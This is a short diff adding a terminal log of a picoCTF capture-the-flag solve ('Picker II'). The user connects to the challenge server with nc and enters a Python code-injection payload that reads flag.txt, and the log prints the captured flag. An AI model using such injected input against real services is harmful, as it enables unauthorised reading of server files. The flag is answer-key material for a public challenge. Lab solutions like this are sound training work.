@@ -1,0 +1,5 @@
+┌─[cristian@Prestige-13-AI]─[~/Descargas/picoCTF/17/Picker II]
+└──╼ $ nc saturn.picoctf.net 61098
+==> print(open('flag.txt', 'r').read())
+picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
+'NoneType' object is not callable
